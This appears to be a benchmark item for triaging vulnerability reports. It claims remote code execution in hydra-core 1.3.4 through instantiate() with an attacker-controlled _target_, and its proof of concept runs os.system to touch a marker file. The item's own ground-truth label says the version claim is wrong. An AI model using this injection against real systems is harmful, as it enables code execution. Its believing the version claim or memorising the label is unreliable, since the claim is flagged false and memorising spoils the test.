report.title: RCE in hydra-core 1.3.4
report.body:
URGENT: hydra-core 1.3.4 is vulnerable to remote code execution. Please assign a CVE.

Code injection via hydra.utils.instantiate() resolving an attacker-controlled _target_.

Affected: 1.3.4.

Proof of concept:

```python
import os, tempfile
marker = os.path.join(tempfile.gettempdir(), "hydra_pwned")
if os.path.exists(marker): os.remove(marker)
from hydra.utils import instantiate
from omegaconf import OmegaConf
cfg = OmegaConf.create({"_target_": "os.system", "_args_": ["touch %s" % marker]})
try:
    instantiate(cfg)
except Exception as e:
    print("instantiate raised:", type(e).__name__)
print("SLOPGATE:REPRODUCED" if os.path.exists(marker) else "SLOPGATE:NOT_REPRODUCED")
```

ground_truth.note: real PoC but claims patched version
